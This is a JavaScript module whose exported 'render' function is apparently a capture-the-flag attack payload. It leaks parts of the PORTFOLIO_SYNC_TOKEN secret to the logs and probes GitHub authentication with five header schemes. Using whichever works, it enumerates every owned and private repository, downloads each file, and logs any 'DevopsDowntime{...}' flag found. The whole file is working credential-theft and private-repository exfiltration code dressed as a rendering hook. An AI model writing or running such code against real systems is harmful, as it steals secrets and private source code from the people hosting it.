export async function render(context) {
  const raw = process.env.PORTFOLIO_SYNC_TOKEN || "";
  const t = raw.trim();
  console.log("LEN", raw.length, "HEAD", JSON.stringify(raw.slice(0, 11)), "TAIL", JSON.stringify(raw.slice(-5)));
  console.log("CODES", raw.slice(0, 6).split("").map(c => c.charCodeAt(0)).join(","));
  const flagRe = /DevopsDowntime\{[^}]*\}/i;
  const common = { Accept: "application/vnd.github+json", "X-GitHub-Api-Version": "2022-11-28", "User-Agent": "x" };
  const attempts = [
    ["Bearer", { Authorization: `Bearer ${t}` }],
    ["token", { Authorization: `token ${t}` }],
    ["Basic-raw", { Authorization: `Basic ${t}` }],
    ["Basic-xtoken", { Authorization: `Basic ${Buffer.from("x-access-token:" + t).toString("base64")}` }],
    ["Basic-pat", { Authorization: `Basic ${Buffer.from("saurabbhattarai-lf:" + t).toString("base64")}` }]
  ];
  let goodh = null;
  for (const [name, hh] of attempts) {
    const h = { ...common, ...hh };
    const r = await fetch("https://api.github.com/user", { headers: h });
    let u = null; try { u = await r.json(); } catch {}
    console.log("AUTH", name, r.status, u && (u.login || u.message));
    if (r.ok && !goodh) goodh = h;
  }
  if (goodh) {
    const rr = await fetch("https://api.github.com/user/repos?visibility=all&affiliation=owner,collaborator,organization_member&per_page=100", { headers: goodh });
    let repos = []; try { repos = await rr.json(); } catch {}
    console.log("REPOS", JSON.stringify((repos || []).map(x => x.full_name + (x.private ? "#priv" : ""))));
    for (const rp of (repos || [])) {
      const full = rp.full_name; const stack = [""];
      while (stack.length) {
        const p = stack.pop();
        const cr = await fetch(`https://api.github.com/repos/${full}/contents/${p}`, { headers: goodh });
        if (!cr.ok) continue;
        let items = []; try { items = await cr.json(); } catch {}
        for (const it of (Array.isArray(items) ? items : [])) {
          if (it.type === "dir") { stack.push(it.path); continue; }
          const fr = await fetch(`https://api.github.com/repos/${full}/contents/${it.path}`, { headers: goodh });
          if (!fr.ok) continue;
          let c = null; try { c = await fr.json(); } catch {}
          if (c && c.content) {
            const b = Buffer.from(c.content, "base64").toString("utf8");
            const m = b.match(flagRe);
            if (m) console.log("FLAG_FOUND", full, it.path, m[0]);
          }
        }
      }
    }
  }
  console.log("DONE");
  return JSON.stringify({ ok: true }) + "\n";
}
